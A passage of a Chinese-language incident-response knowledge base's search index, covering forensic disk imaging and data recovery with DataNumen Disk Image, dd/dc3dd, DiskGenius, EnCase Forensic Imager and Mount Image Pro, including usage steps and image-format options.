    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Clonezilla/index.html"
  },
  {
    "content": "Datanumen disk image：\nhttps://www.datanumen.com/disk-image/免费管理磁盘驱动器镜像创建制作和恢复的软件\n简介 DataNumen Disk Image是一个强大的工具来克隆和恢复磁盘或驱动器。它可以一个字节一个字节地创建和恢复磁盘映像或驱动器映像。实用的数据备份和恢复，磁盘/驱动器复制和克隆，和取证。\n特性 支持各种磁盘和驱动器。\n支持Windows 95/98/ME/NT/2000/XP/Visa/7/8/8.1/10和Windows Server 2003/2008/2012/2016/2019。\n支持恢复图像数据回驱动器。\n支持从损坏的媒体克隆数据。\n支持用指定的数据替换损坏的扇区。\n支持批量克隆多个磁盘和驱动器。\n理想用作计算机取证工具和电子发现(或e-discovery, eDiscovery)工具。\n使用 使用DataNumen Disk Image为驱动器和磁盘创建映像\n视频教程：https://youtu.be/idTwljaqOWQ\n打开DataNumen Disk Image 注意:在使用DataNumen磁盘映像创建驱动器或磁盘映像之前，请关闭任何其他应用程序。\n选择需要创建镜像的驱动器或磁盘 如果您插入了USB驱动器，但在驱动器或磁盘列表中看不到它。您可以单击刷新按钮，然后重试。\n接下来，设置输出镜像文件名 您可以直接输入图像文件名，也可以单击“浏览”按钮浏览并选择图像文件。\n开始镜像 单击“开始克隆”按钮，DataNumen Disk Image将开始克隆指定驱动器或磁盘中的数据，并将其保存到输出镜像文件中。进度条：\n镜像结束 在克隆过程之后，如果镜像文件创建成功，您将看到这样的消息框:\n现在你可以将磁盘映像用于不同的目的，包括:\n使用它作为原始驱动器或磁盘的备份。 将映像恢复到原始驱动器或磁盘，或另一个驱动器或磁盘。 从图像中恢复数据。 对图像进行法医数据分析。 ",
    "description": "",
    "tags": null,
    "title": "Datanumen_disk_image",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Datanumen_disk_image/index.html"
  },
  {
    "content": "dd镜像取证\n在一些无法使用工具的特殊情况下可以考虑dd做镜像，注意不要将镜像保存到被取证硬盘中，覆盖磁盘造成证据现场破坏。\n使用dd做磁盘镜像 dd一般镜像方式 1、fdisk -l 判断目标磁盘编号：\n#if=指定需要制作映像设备，-of=指定保存的位置。\n2、dd if=/dev/sda\nof=/mnt/udisk/Forensic/dd/sda\ndd速度非常慢，且在备份过程中没有任何进度提示，直接放弃换用增强版dd——dc3dd。\ndd镜像+压缩 由于dd格式的镜像被取证盘大小就是dd镜像大小，因此一般镜像时还可以带上压缩命令如下\ndd if=/dev/sda3 | gzip \u003e /bak/172_28_179_126/dev_sda3.gz //直接压缩\ndd镜像+压缩+分片 dd if=/dev/mapper/vg_local_root-lv_home | gzip | split -b 1G -d -a 3 - /bak/172_28_179_126/dev_mapper_vg_local_root-lv_home.dd.gz //分片压缩\n使用dc3dd做磁盘镜像 dc3dd和dd参数使用是一样的，它们一样是完整备份，对备份盘容量需求比较大，这里只备份sda3（D盘），可以看到备份了约6GB大小。\ndc3dd if=/dev/sda\nof=/mnt/udisk/Forensic/dd/sda\n最终D盘分区镜像大小5.81GB。\n参考文章 https://www.secpulse.com/archives/138600.html\n",
    "description": "",
    "tags": null,
    "title": "dd/dc3dd(linux)",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dddc3ddlinux/index.html"
  },
  {
    "content": "官网 https://www.diskgenius.cn/\nDiskGenius有免费版、标准版与专业版三个版本状态（功能对比）。三个版本共用同一个发行包，不必分别下载。\n下载后，即可立即使用免费版DiskGenius；注册后，可自动升级为标准版或专业版。\n下载 https://www.diskgenius.cn/download.php\n软件教程 https://www.diskgenius.cn/help/\n帮助手册离线版[https://www.diskgenius.cn/help/DiskGenius%20%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.pdf](https://www.diskgenius.cn/help/DiskGenius 用户使用手册.pdf)\n使用方法 使用DiskGenius恢复数据 当计算机内的文件被有意无意的删除、或遭到病毒破坏、分区被格式化后，若想恢复这些已丢 失的文件，均可使用本功能。实际上，操作系统在删除文件时，只是将被删除文件打上了“删除标 记”，并将文件数据占用的磁盘空间标记为“空闲”。文件数据并没有被清除，还静静地“躺”在 磁盘上。只要删除文件后没有建立新的文件，操作系统没有写入新的数据，这些被删除的文件数据 就不会被破坏，就有机会通过一定的技术手段将它们“抢救”出来。\n格式化操作执行时并不会考虑磁盘上原来的数据内容，也不会先删除旧文件。不同的文件系统 类型，格式化的具体操作内容也不同。对于 FAT32、FAT16、FAT12 等文件系统，格式化时会清除 文件分配表(简称 FAT，固定位于分区的开始部分，含有文件数据的定位信息)及根目录。文件数据 一般不会被清除。对于 NTFS 文件系统，格式化时新写入的数据没有固定位置要求，但正常情况下 每次格式化时的写入位置不会变化。因此旧文件数据大多不会被覆盖，仍存在大量残余信息供我们 找到丢失的文件。\n本功能就是通过分析残留在磁盘上的文件的部分信息来重新找到文件数据及文件夹的层次结 构，从而达到恢复文件数据的目的。\n对于整个分区已经丢失的情况，请首先参阅“搜索已丢失分区(重建分区表)”功能，先搜索到 丢失的分区。然后可以在保存分区表后、或在不保存分区表的情况下再利用“文件恢复”功能恢复 分区内的文件。\n分区被破坏的表现有：在“我的电脑”中打开分区时系统提示“未格式化”“需要格式化”， 分区属性显示为“RAW”，打开分区后看不到任何文件。遇到这些情况时，都可以通过“误格式化 后的文件恢复”功能来恢复文件。\n本功能支持 NTFS、exFAT、FAT32、FAT16、FAT12、EXT4、EXT3、EXT2 等文件系统类型 的磁盘分区、支持使用这些文件系统格式的硬盘、移动硬盘、RAID 卷、U 盘、存储卡(如数码相机 中的 SD 卡、XD 卡等等)、虚拟磁盘。\n为保护正在恢复的分区不被再次破坏，本软件在搜索分区内的文件时，会采用只读模式，不会 向分区写入任何数据。\n要开始恢复文件，首先选择丢失文件所在的分区，然后点击工具栏“恢复文件”按钮，或点击 主菜单“工具”中的“已删除或格式化后的文件恢复”菜单项，以打开文件恢复对话框。如下图：\n由于格式化后的文件恢复与文件正常删除后的恢复过程不同，我们将这两种情况分别处理。下 面是具体的操作方法：\n一、恢复已删除的文件： 如果确定文件是删除的，在恢复文件对话框中选择“恢复已删除的文件”。 如果在文件被删除之后，文件所在的分区有写入操作，则最好同时勾选“额外扫描已知文件类 型”选项，并点击“选择文件类型”按钮设置要恢复的文件类型。勾选这个选项后，软件会扫描分 区中的所有空闲空间，如果发现了要搜索类型的文件，软件会将这些类型的文件在“所有类型”文 件夹中列出。这样，如果在删除之前的正常目录中找不到删除过的文件，就可以根据文件扩展名在 “所有类型”里面找一下。\n很多情况下，即使刚刚删除的文件，通过普通的删除恢复功能也无法找回。这是因为已删除文 件的重要信息被操作系统或用户的误操作破坏了。这种导致二次破坏的操作往往是在不经意间发生 的。比如在误删除了一些照片文件后，马上打开“资源管理器”在各个目录中找寻刚刚删除的文件 并使用了Windows的缩略图预览功能。恰恰是这样的操作就足矣破坏已删除文件的大量重要信息。 因为缩略图预览功能会在文件夹下面生成缩略图缓存文件。类似的不经意操作有很多。在这种情况 下，必须通过“扫描文件类型”的方式来恢复文件。虽然通过这种方式找到的文件，文件名是用序 号来命名的，但仍然可以通过预览功能、或者复制出来后打开确认。特别是对于恢复照片及 Office 文档时非常有效。\n由于扫描文件类型时速度较慢(需要扫描所有空闲扇区)，建议先不使用这个选项，用普通的方 式搜索一次。如果找不到要恢复的文件，再用这种方式重新扫描。\n点击“开始”按钮以开始搜索过程：\n搜索完成后，恢复文件对话框自动关闭。程序主界面将显示搜索到的文件，每个丢失的文件或 文件夹前面都有一个复选框，左侧的文件夹层次图中的条目也加上了复选框。见下图。\n对于不能确定归属的文件及文件夹，程序将它们统一放到一个叫做“孤立的文件”的内存文件 夹中。如果在原位置找不到要恢复的文件，可以尝试在“孤立的文件”文件夹中查找文件。恢复后 查找文件时不要忘了这个文件夹，很可能要恢复的重要文件就在这里。\n在恢复文件的状态下，文件列表中的“属性”栏将给已删除文件增加两个标记“D”和“X”。 “D”表示这是一个已删除的文件。“X”表示这个文件的数据可能已被部分或全部覆盖，文件数据 完全恢复的可能性较小。\n在扫描完成的界面中，会出现“红色删除标志”与“绿色删除标志”。“红色删除标志”表示 文件或文件夹是被删除的，“绿色删除标志”表示文件夹中含有删除的文件或文件夹。如下图所示：\n为方便用户识别搜索到的文件，软件默认情况下也会显示未被删除的正常文件，只是正常文件 没有复选框，不可选择。\n要恢复搜索到的文件，请通过复选框选择要恢复的文件。然后在文件列表中点击鼠标右键，或 打开“文件”主菜单，选择“复制到指定文件夹”菜单项。\n接下来选择存放恢复后文件的文件夹，点击“选择文件夹”按钮，程序会将当前选择的文件复 制到指定的文件夹中。为防止复制操作对正在恢复的分区造成二次破坏，本软件不允许将文件恢复 到原分区。\n点击“完成”按钮，关闭文件复制对话框，程序自动清除已复制的文件的选择状态。以准备选 择其它文件。\n当所有要恢复的文件都复制出来后。可以通过“分区 - 重新加载当前分区”菜单项释放当前 分区在内存中的暂存数据，并从磁盘加载当前分区，显示分区的当前状态。\n二、完整恢复： 适用于分区被格式化，或是分区被破坏打不开的情况，如：在“我的电脑”中打开分区时系统 提示“未格式化”、“需要格式化”，分区属性显示变为“RAW”，打开分区后看不到任何文件。 这时软件会默认选择选择“完整恢复”，而“恢复已删除的文件”默认为不勾选的状态。用“完整 恢复”的同时建议勾选“额外扫描已知文件类型”选项，并点击“选择文件类型”按钮设置要恢复 的文件类。勾选这个选项后，软件会在正常扫描的同时根据特定文件类型的文件头数据恢复指定类 型的文件。恢复完成后，将所有找到的文件类型，按类型扩展名划分目录，整理到一个单独的虚拟 “分区”中。除搜索速度稍慢外，不影响正常恢复，但能恢复更多的文件。\n三、恢复已删除的文件 与 完整恢复 同时选择： 打开“恢复文件”功能默认情况下是两个功能都选择，如果自己不确定文件丢失的情况下，建 议两个都勾选。这个功能是先扫描删除的文件再扫描全盘。扫描的同时最好勾选“额外扫描已知文 件类型”选项，并点击“选择文件类型”按钮设置要恢复的文件类型。勾选这个选项后，软件会在 正常扫描的同时，根据特定文件类型的文件头数据恢复指定类型的文件。恢复完成后，将所有找到 的文件类型，按类型扩展名划分目录，整理到一个单独的虚拟“分区”中。除搜索速度稍慢外，不 影响正常恢复，但能恢复更多的文。\n点击“开始”按钮以开始搜索过程。该恢复方式的搜索时间较长。接下来的操作步骤和“恢复 误删除文件”过程相同。参照上面的方法选择与复制文件即可。\n保存文件恢复进度 在恢复数据的时候，如果丢失数据的分区或硬盘空间很大，通常会需要比较长的时间进行扫描。\n用户可以将扫描进度进行保存，这样如果软件被关闭了，可以加载之前的恢复进度，无需再从头开\n始扫描，节约时间。\n本软件在搜索文件的时候会自动保存进度，但是，如果本软件位于扫描范围内，软件将不会\n自动保存扫描进度，以免产生不必要的写入操作。遇到这种情况，用户可以手动保存恢复进度。\n一、保存文件恢复进度 扫描结束后，点击“工具”菜单，然后选择“保存文件恢复进度”选项。 选择保存路径并为文件命名，然后点击“保存”按钮。 提醒：扫描进度文件的扩展名是“.dgrp”，软件自动保存的进度文件是存放在软件所在的文 件中。 二、加载恢复进度 选中之前扫描并保存过恢复进度的分区，然后点击“恢复文件”按钮。 在恢复文件窗口上点击“加载扫描进度”按钮。 选中自己保存的扫描进度文件，然后点击“打开”按钮。 点击文件恢复窗口上的“开始”按钮，软件开始加载之前的扫描进度。 按指定文件类型恢复文件 有时，分区内数据毁坏的比较严重，按普通的恢复模式，效果不好。这时可以尝试按指定文件 类型恢复文件。\nDiskGenius 按指定文件类型恢复文件的功能非常强大，支持的文件类型有 100 多种，恢复的 效果好，使用起来也非常方便。\nDiskGenius 有两种按指定文件类型恢复文件的方式，在误删除或误格式化后的文件恢复恢复 模式中，DiskGenius 已经提供了附加的按文件类型搜索文件的功能，并在搜索结果中，显示了按文 件类型搜索出来的文件列表；此外，DiskGenius 专门提供了一种直接输出文件的按类型恢复文件的 模式，这种恢复模式，比前一种，更加灵活。比如可以搜索空闲区域，可以指定文件数据的对齐位 置等。\n使用按指定文件类型恢复模式恢复文件，从主菜单中选择 “工具” - “恢复指定类型的文件” 在接下来的弹出窗口中，用户可以对恢复模式的一些参数进行设置。比如可以只恢复空闲簇，适用于误删除、或分区被部分覆盖等情况。 点击\"选择文件类型\"按钮，可以设置本次搜索的特定文件类型，默认是搜索所有的文件类型，可以设置为只搜索一部分文件类型。 搜索完毕后，被搜索到的文件按文件类型分类，每种文件类型有一个或多个以该文件类型 名命名的文件夹，每个文件夹中的文件数最大为 1000。 用这种模式搜索出来的文件，其文件名会丢失，DiskGenius 是按顺序号为这些文件命名的， 要想判断这里面有没有您需要的文件，您可以通过文件大小等方面，结合文件预览功能，逐一打开 预览来判断。 ",
    "description": "",
    "tags": null,
    "title": "DiskGenius(win)",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGeniuswin/index.html"
  },
  {
    "content": "EnCase Forensic Imager(win)\nEnCase V8是美国Guidance Software推出的最新计算机取证软件，全新的操作界面，采用全新的取证分析的工作流，让新版更加简单易用，提供了更加强大灵活的报告功能（可模板定制），此外EnCase V8将原有EnCase v7所有模块(VFS/PDE/EDS/FastBloc SE/CD-DVD)及Neutrino手机取证功能全部集成，成为业界首先将计算机取证、手机取证综合一体的电子数据取证分析软件。\nGuidance Software Inc.是全球知名的计算机取证厂商，成立于1997年，在纳斯达克上市(NASDAQ: GUID)，总部设立在美国。其EnCase计算机取证系列产品在美国、欧洲等地的执法部门、司法机关及世界五百强（Fortune 500)广泛使用，在美国联邦法院、地方法院收到认可，已成为业界标准。目前已销售超过40000套EnCase产品，每年培训的取证专业人员超过6000人\n当时间很短，您需要获取整个卷或选定的个人文件夹或文件，EnCase®法医Imager是您的选择工具。基于可靠的行业标准EnCase®取证采集技术，EnCase取证成像仪:\n特性 允许获取本地驱动器 可以免费下载和使用吗 不需要安装 一个独立的产品不需要装箱取证许可证吗 允许浏览和查看潜在的证据文件，包括文件夹结构和文件元数据 使用强AES 256位加密保护Lx01和Ex01文件 可以通过USB部署，并用于执行获取一个实时设备 支持源数据格式 EnCase Imager支持处理常见的各种数据类型：\n镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式） 本地连接的各种磁盘、存储卡 内存数据 远程数据（需要配合LinEn使用） 其中支持镜像文件，主要用来转换格式，以减小原镜像体积，以及添加证据编号、备注信息等各种元数据。\n支持镜像文件格式 EnCase Imager可以生成四种格式的镜像，分别是现行的\nEnCase证据文件（.Ex01） 现行的EnCase逻辑证据文件（.Lx01） 传统的EnCase证据文件（.E01） 传统的EnCase逻辑证据文件（L01） 如果需要处理的对象是整个存储设备或整个分区，应该保存成E01或Ex01格式；如果仅仅对源数据中的部分文件制作镜像，应该选择L01或Lx01格式。\n** **\nEx01及Lx01格式是EnCase V7引进的新格式，该格式最大的变化是支持数据加密，设置密码后若不知道密码，无法读取镜像中的数据。E01及L01文件虽然也支持添加密码，但是密码仅用来限制镜像文件的打开，数据部分并未真正加密，很多取证工具可以直接忽略E01及L01文件的密码。\n如果工作中要使用其他取证工具进行分析，为了保证兼容性，建议选择E01及L01格式，否则可以使用Ex01及Lx01格式。\n使用EnCase Imager镜像 这里找到了一篇非常详尽的文章直接作为参考来自胡壮的个人博客：https://www.hustrong.com/2018/%E4%BD%BF%E7%94%A8EnCase-Imager%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F.html\n使用EnCase Imager制作证据文件 接下来以一个实际案例来来介绍EnCase Imager的主要功能——制作磁盘镜像。实验选用了一个朗科32G优盘，序列号为AA00000000007275。\n添加设备 在主界面点击“Add Local Device”，弹出添加本地设备的窗口，串口左边有6个可勾选项，点击某个选项，右边会出现对应的说明。如下图所示。\n添加本地设备选项\n六个勾选项的含义如下：\nDetect Tableau hardware 检测Tableau硬件。如果没有连接Tableau设备，建议不要勾选。 Only show Write-blocked 只显示只读设备。勾选后后续的设备列表中仅显示只读设备。 Detect leagacy FastBloc 检测传统的FastBloc设备。如果没有连接FastBloc设备，建议不要勾选。 Enable DCO Removal 解除DCO限制。勾选后会忽略一些硬盘的DCO设置，可处理隐藏空间。 Enable Physical Memory 物理内存获取。勾选后后续的设备列表中会出现物理内存，如果需要制作内存镜像则必须勾选。 Enable Process Memory 进程内存获取。勾选后后续的设备列表中会出现各进程的列表，如果需要制作各进程内存镜像则必须勾选。 我们直接点击“下一步”，并且勾选序号为29、磁盘序号为14的优盘。注意不要勾选成了序号为30的那一项，否则只会加载优盘中的整个分区内容，卷引导记录等信息将不被包括。如下图所示。\n设备列表\n点击“完成”后，会自动打开“Evidence”标签页，可以看到磁盘14已经添加到证据列表中。如下图所示。\n证据列表\n开始制作镜像 双击证据列表中的设备名“14”，或选中该项，点击“OPEN”，即可打开并浏览优盘中的数据。\n打开该证据后，点击菜单栏的“Acquire”→“Acquire”即可开始制作镜像。需要注意的是，如果要制作整个优盘的镜像，树形面板中选中的必须是整个设备，对于本案例来说，选中的必须是“Entry”或“14”，否则接下来默认制作的仅仅是分区部分的镜像。\n开始制作镜像\n设置证据文件参数 接下来需要设置证据文件的参数等信息，弹出的页面中包括“Location”、“Format” 及“Advanced”三部分设置选项。这些设置项是制作证据文件的关键。\n保存位置等设置项\n** ** 保存位置等设置项\nName 设备名。默认也是镜像文件名。 Case Number 案件编号。 Evidence Number 证据编号。 Examiner Name 检验人员姓名。这一项是必填项。 Note 备注信息。 Output Path 输出路径。证据文件保存路径。 Alternate Path 备用路径。当镜像保存路径空间不够时，会保存到此位置。 证据文件格式等设置项\n** ** 证据文件格式等设置项\nEvidence File Format 证据文件格式。可以选择E01或Ex01格式。 Compression 压缩。可以选择启用或不启用数据压缩。 Verification 校验哈希。用于计算数据区域的哈希值并保存在镜像文件的元数据中，可选择不校验或或MD5校验、SHA-1校验、MD5及SHA-1同时校验。 File Segment Size(MB) 分段大小。设置单个证据文件大小，大于此值则自动生成E02、E03或Ex02、Ex03等文件。此值默认为2048(MB)，最小值为30(MB)。 Password 密码。此选项仅对E01格式有效，设置后，后续使用EnCase加载镜像文件需要此密码。 EnCryption 加密。此选项仅针对Ex01格式有效，可以对生成的镜像进行加密。 高级设置选项\n** ** 高级设置选项\nBlock size(Sectors) 块大小。生成镜像文件时候的分块大小，保持默认即可。 Error Granularity 错误粒度。当设备遇到坏道、坏块时记录这些区域的精细程度，可以选择标准（standard）或精细（Exhaustive），保持默认即可。 Start Sector 起始扇区。如果制作的是整个设备的镜像，此值为“0”。 Stop Sector 结束扇区。 Read ahead 预读取。本人使用过程中一直不可选，暂时不知道使用场景。 keep GUID 极路GUID，暂时没有找到相关资料。 Threads 线程。可以设置读取线程和工作线程，读取线程默认为1，工作线程默认为5，一般保持默认。 本案例中，镜像格式选择了兼容性比较好的E01，名称填写了“thumb”，案件编号填写了“20180616001”，证据编号填写了“20180616001-000-001”，操作人员填写了我的名字“胡壮”，备注信息填写了“EnCase Imager测试”，镜像保存路径选择了D盘根目录。\n和FTK Imager等其他工具不同，EnCase Imager不允许操作人员字段留空。虽然其他字段可以留空，但是为了后续工作方便，强烈建议大家在制作镜像时尽量将所有字段按照实际情况填写完整。\n一切设置好后，点击“确认”即可开始制作镜像，此时EnCase Imager窗口右下角会显示剩余时间。制作完成后，EnCase Imager会对镜像进行校验并替换掉证据列表中的源设备，后续的浏览操作全部基于镜像文件，校验时EnCase Imager窗口右下角同样会显示剩余时间。如下图所示。\n镜像中\n校验中\nEnCase Imager证据文件中包含的数据 镜像制作完毕后，在EnCase Imager窗口的证据列表中，可以查看镜像中的详细信息。如下图所示。\n镜像中包含的信息\n镜像中记录的一些信息如下：\n证据名称：thumb 优盘名称：Netac 优盘序列号：AA00000000007275 优盘型号：OnlyDisk 案件编号：20180616001 操作人员：胡壮 证据编号：20180616001-000-001 备注信息：EnCase Imager 测试 源数据MD5：185d0bdb0398fd6711fe65ec3920dfca 源数据SHA-1：896025a0f3a6ba4544a8dcf08d99cfa67317cd6f 制作镜像的EnCase版本：7.09 制作镜像时候操作系统版本：Windows 7 压缩级别：最好 制作逻辑证据文件 选择需要的文件 制作逻辑证据文件，步骤与制作证据文件镜像比较相似，将所在磁盘或分区添加到证据列表，并打开证据进行浏览。和EnCase不同，EnCase Imager不允许直接将单个文件添加作为证据。\n勾选需要的文件，点击菜单栏的“Acquire”→“Create Logical Evidence file”或列表面板右击选择“Acquire”→“Create Logical Evidence file”即可开始制作逻辑证据文件。本案例中勾选了“.disk”目录下的5个文件制作逻辑证据文件。如下图所示。\n制作逻辑证据文件\n设置逻辑证据参数 制作逻辑证据文件，需要设置的参数比制作证据文件稍微少一些，但这些参数比制作证据文件时更难理解。\n保存位置等设置项\n** ** 保存位置等设置项\nName 设备名。默认也是逻辑证据文件文件名。 Case Number 案件编号。 Evidence Number 证据编号。 Examiner Name 检验人员姓名。这是必填项。 Note 备注信息。 Add to existing evidence file 追加到现有证据文件。将选中的文件添加都现存的某个逻辑证据文件，勾选此项后上面的信息无法填写。 Output Path 输出路径。逻辑证据文件保存路径。 文件信息\n** ** 文件信息\nSource 数据源。显示将要制作逻辑证据文件的文件的来源。 Files 文件。显示将要制作逻辑证据文件的文件的数量及总大小。 Target folder within Evidence File 证据文件中的目标文件夹。可选项，未填写时，所有文件直接保存在逻辑证据文件中，填写后，文件保存在逻辑证据文件中的对应文件夹中。 Include contents of files 包括文件内容。如果不勾选，创建的逻辑证据文件中不包括文件内容部分，只包括属性等部分内容，适用于大文件且不关心文件内容本身。 Include contents of folder objects 包括文件夹内容。 File in use 被占用的文件。 Lock file when completed 完成后锁定文件。勾选后生成的逻辑证据文件不可追加新内容。 Include original extents 包括原始位置信息。勾选后，生成的记录文件中会包含文件的物理位置、物理扇区等信息。 上面这部分选项可以根据实际需要勾选。\n逻辑证据格式\n** ** 逻辑证据格式\nEvidence File Format 逻辑证据文件格式。可以选择L01或Lx01。 Entry Hash 文件哈希。可以选择是否计算机勾选文件（或文件夹）的MD5值。 Compression 压缩。可以选择镜像文件是否压缩。 File Segment Size(MB) 分段大小。和制作证据文件时候的用法一致。 Encryption 加密。仅对Lx01格式有效，可以对数据部分进行加密。 本案例中，逻辑证据格式选择了L01，名称填写了“disk目录文件”，案件编号填写了“20180616001”，证据编号填写了“20180616001-000-002”，操作人员填写了我的名字“胡壮”，备注信息填写了“重要文件”，“Target folder within Evidence File”填写了“disk目录文件”，镜像保存路径选择了D盘根目录，文件相关的设置全部勾选。\n逻辑证据文件包含的内容 制作好了逻辑证据文件，回到EnCase Imager的证据列表界面，将D盘的“disk目录文件.L01”拖到EnCase Imager窗口然松开鼠标，即可将将制作的逻辑证据文件添加到EnCase Imager。为了方便待会进行对比，才次将测试优盘添加到证据列表（制作完证据文件后最初添加进证据列表中的优盘已经被证据文件thumb.E01替代了）。如下图所示。\n添加逻辑证据文件到EnCase Imager\n通过观察，对比上文中加载的证据文件截图，可以发现逻辑证据文件是没有整个数据部分的哈希值的，也无法无法记录诸如原始设备的序列号等信息。\n同时勾选证据列表中的证据文件“thumb”、逻辑证据文件“disk目录文件”及磁盘编号为“14”的优盘，然后点击“OPEN”按钮，同时加载三个证据项目进行浏览。如下图所示。\n同时打开多个证据\n点击证据“thumb”第一分区的“.disk”目录左边的遍历按钮（正方形勾选框左边的五边形），然后按住Ctrl键不放，接下来点击证据“disk目录文件”的“disk目录文件”和证据“14”第一分区“.disk”目录录左边的遍历按钮，同时在右边的列表面板列出三个目录中的文件。如下图所示。\n同时浏览多个目录文件\n接下来分别比较“thumb\\C.disk\\casper-uuid-generic”、“disk目录文件\\disk目录文件\\casper-uuid-generic”及“14\\C.disk\\casper-uuid-generic”三个文件。如下图所示。\ndisk目录文件\\disk目录文件\\casper-uuid-generic\n14\\C.disk\\casper-uuid-generic\n通过对比，证据文件中的“casper-uuid-generic”和另外两个证据中的对应文件相比多了File Acquired时间，而逻辑证据文件中的“casper-uuid-generic”和另外两个证据中的对应文件相比则多了MD5值。另外一个出不明显的地方是，逻辑证据文件中保存的文件无法查看文件在文件系统的路径，而证据文件则不存在此问题。\n总结 EnCase Imager的功能基本相当于没有插加密狗或导入授权证书文件的EnCase，但是EnCase可以使用条件及过滤器对文件进行筛选。和其他镜像工具不不同，EnCase Imager虽然支持浏览本地磁盘会镜像文件中的文件，且浏览的时候可以直接显示部分删除的文件，但EnCase Imager仅支持查看文件的目录结构及各项属性，不支持对文件进行任何操作，包括文件的预览及导出。\nEnCase Imager制作的镜像文件中，保存的元数据比其他镜像工具要多，例如磁盘的型号、序列号，包括FTK Imager在内的大部分镜像工具制作镜像时都不会保存。\n本文仅仅是蜻蜓点水般地介绍了EnCase Imager的基本功能，算是抛砖引玉，诸如内存镜像、镜像还原、哈希计算、EnScript等功能，大家可以自己去摸索。\n参考文章 https://www.yidianzixun.com/article/0JUs8BhG\nhttps://security.opentext.com/document/product-brief/encase-forensic-imager\n",
    "description": "",
    "tags": null,
    "title": "EnCase_forensic_imager.",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/index.html"
  },
  {
    "content": " 分子实验室 https://molecule-labs.com/\n**官网：**https://getdataforensics.com/product/mount-image-pro/\n介绍： GetData Mount Image Pro镜像文件虚拟工具是一款非常优秀的讲镜像文件虚拟成硬盘的工具软件。简单易操作，程序可以帮助你将.e01、.s01、.raw、.dd、.iso等镜像文件模拟成一个硬盘的分区，比如“F盘”，从而方便你进行读取和访问\nGetData Mount Image Pro是来自国外的一款功能强大的镜像文件虚拟工具，可帮助用户将.e01、.s01、.raw、.dd、.iso等镜像文件虚拟成硬盘分区，通俗将就是把一个iso这类的文件虚拟成你电脑你的一个盘符，如g:盘，既方便了文件管理，同时，还可帮助用户在安装系统时，直接利用虚拟的磁盘分区执行系统的安装操作，从而免去了需要U盘或者光驱的安装方式。\nMount Image Pro将电子取证镜像文件作为驱动器号挂载在Windows下，包括e01、Ex01、.l01、Lx01和.ad1镜像格式。这样可以访问整个镜像文件的内容，允许用户:\n使用标准的Windows程序浏览和打开内容，如Windows Explorer和Microsoft Word。 在挂载的文件系统上运行第三方应用程序。 出口文件。 挂载的数据保留在一个安全的环境中，其中镜像文件的内容不会被更改。\nMount Image Pro包含专有驱动程序，允许访问所有映像内容，包括系统文件、已删除的文件和未分配的集群。\nMount image Pro拥有完整的命令行功能，经常作为第三方应用程序访问取证数据的引擎使用。\n特性 挂载以下镜像文件类型:\n访问数据.AD1 苹果DMG 框。e01, Ex01, l01, Lx01 取证文件格式.aff ISO (CD及DVD影像) 微软VHD .VHDX NUIX MFS01 ProDiscover SMART Unix/Linux DD和原始映像 VMWare Xways容器文件 支持访问Bitlocker或FileVault驱动器(必须知道密码)。\n电子取证相关特性:\n作为只读挂载或模拟磁盘写入缓存文件。 显示或隐藏删除的文件和系统文件(包括未分配的集群)。 没有Windows安全权限挂载文件。 完全的命令行支持与能力批处理。\n挂载所有常见的文件系统，包括:\nNTFS, FAT, FAT16, FAT32, HFS, APFS, EXT2/3/4; 可以与HFS和Linux EXT2/3/4的第三方文件系统驱动一起使用。 挂载物理和逻辑磁盘。与GetData servlet MIP一起使用，可以挂载远程物理或逻辑磁盘(使用UDP通过ip地址访问)，可以通过FEX Imager或FTK Imager镜像。\n下载 官方下载：https://getdataforensics.com/product/mount-image-pro/download/\n官网有很多商业化工具：GetData Mount Image Pro\n安装： GetData Mount Image Pro镜像文件虚拟工具安装教程：\n1、下载Mount Image Pro软件并解压缩;\n2、双击MIP-Setup.exe运行安装包进入安装向导;\n3、默认中文，然后点击“OK”;\n4、默认位置C:\\Program Files\\Mount Image Pro;\n5、你也可以点击浏览更改安装位置并点击“下一步”;\n6、最后点击“安装”即可安装完成。\n操作说明： 官方在产品页面有操作手册\nhttps://getdataforensics.com/product/mount-image-pro/\nv7 版的操作手册下载：\n[http://download.getdata.com/support/fex/documents/Mount%20Image%20Pro%20v7%20User%20Guide.en.pdf](http://download.getdata.com/support/fex/documents/Mount Image Pro v7 User Guide.en.pdf)\n从操作手册中可以了解到，其正常流程\n挂载类型-汇总 Mount Image Pro提供不同的挂载方式：\n硬盘方式 文件系统方式 挂载 磁盘 文件系统 应用现有的Windows安全设置 y n 26取证图像限制(可用驱动器号) y n 使用第三方工具访问整个物理驱动器 y n 磁盘显示在“Windows磁盘管理”中(*带有PNP选项) y n 显示被删除的文件 n y 以文件的形式显示未分配的集群 n y 显示Windows系统文件(MFT, FAT, VBR等) n y 快速开始 在开始前 写保护物理设备:\n计算机取证的一个公认原则是，只要有可能源数据可被分析那么调查人员就不得随意修改调查取证内容。如果物理介质，如硬盘驱动器，USB驱动器，相机卡等是一个潜在的证据来源，建议当媒体连接到取证工作站它是这样做的使用写块设备。参见附录2 -写阻塞了解更多信息\n信息。\n病毒和恶意软件\n调查员应该意识到在法医工作站安装第三方数据的固有风险。任何时候都应该使用适当的病毒和恶意软件保护。\n开始挂载 通过图形界面挂载取证镜像：\n安装Mount Image Pro\n激活产品\n挂载镜像：\n选择File \u003e Mount Image File 选择需要挂载的镜像 在工具栏中的按钮，点击Mount \u003e Add 